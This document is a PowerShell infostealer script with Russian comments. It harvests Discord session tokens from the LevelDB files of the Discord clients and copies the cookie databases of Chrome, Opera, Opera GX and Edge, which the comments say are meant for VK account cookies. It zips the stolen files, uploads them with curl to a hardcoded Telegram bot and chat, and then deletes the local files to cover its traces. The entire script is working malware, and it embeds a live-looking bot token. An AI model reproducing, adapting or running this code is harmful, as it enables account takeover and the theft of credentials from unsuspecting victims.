# НАСТРОЙКИ ТГ
$botToken = "8775216222:AAGRYC6FinsJPr9_UEXTY42Gk_eNYW66wn4"
$chatId = "7719438428"

$tempPath = $env:TEMP
$zipPath = "$tempPath\data.zip"
$filesToZip = @()

# 1. СБОР ТОКЕНОВ DISCORD (Браузер + Приложения)
$discordPaths = @(
    "$env:APPDATA\discord\Local Storage\leveldb",
    "$env:APPDATA\discordcanary\Local Storage\leveldb",
    "$env:APPDATA\discordptb\Local Storage\leveldb"
)

$discordTokens = @()
foreach ($path in $discordPaths) {
    if (Test-Path $path) {
        Get-ChildItem "$path\*.ldb" | ForEach-Object {
            $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
            # Регулярка ищет стандартный формат токена Discord
            $matches = [regex]::Matches($content, '[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9]{27}')
            foreach ($m in $matches) {
                $discordTokens += $m.Value
            }
        }
    }
}

if ($discordTokens.Count -gt 0) {
    # Удаляем дубликаты
    $uniqueTokens = $discordTokens | Select-Object -Unique
    $uniqueTokens | Out-File "$tempPath\discord.txt" -Encoding utf8
    $filesToZip += "$tempPath\discord.txt"
}

# 2. СБОР КУКИ ВК (Копируем базы браузеров)
$browserPaths = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies",
    "$env:APPDATA\Opera Software\Opera Stable\Default\Network\Cookies",
    "$env:APPDATA\Opera Software\Opera GX Stable\Default\Network\Cookies",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Network\Cookies"
)

foreach ($path in $browserPaths) {
    if (Test-Path $path) {
        $dest = "$tempPath\cookies_$(Get-Random).db"
        Copy-Item $path $dest -Force -ErrorAction SilentlyContinue
        if (Test-Path $dest) {
            $filesToZip += $dest
        }
    }
}

# 3. ОТПРАВКА В ТГ
if ($filesToZip.Count -gt 0) {
    Compress-Archive -Path $filesToZip -DestinationPath $zipPath -Force
    
    $url = "https://api.telegram.org/bot$botToken/sendDocument"
    curl.exe -s -F "chat_id=$chatId" -F "document=@$zipPath" $url > $null
    
    # Очистка следов
    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
    foreach ($f in $filesToZip) { 
        Remove-Item $f -Force -ErrorAction SilentlyContinue 
    }
}